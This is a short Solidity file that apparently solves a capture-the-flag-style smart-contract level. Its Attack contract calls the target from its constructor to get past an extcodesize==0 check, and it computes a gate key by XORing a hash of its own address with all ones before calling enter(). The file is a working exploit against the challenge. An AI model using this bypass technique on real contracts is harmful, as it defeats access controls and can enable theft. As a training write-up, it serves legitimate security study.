
/****attack Contract****/

//no og contract cause of "extcodesize=0" condition

pragma solidity ^0.6.0;
contract Attack {
    constructor(address _instance) public {
        bytes8 gateKey = bytes8( uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ (uint64(0) - 1) );
        _instance.call(abi.encodeWithSignature('enter(bytes8)', gateKey));
    }
}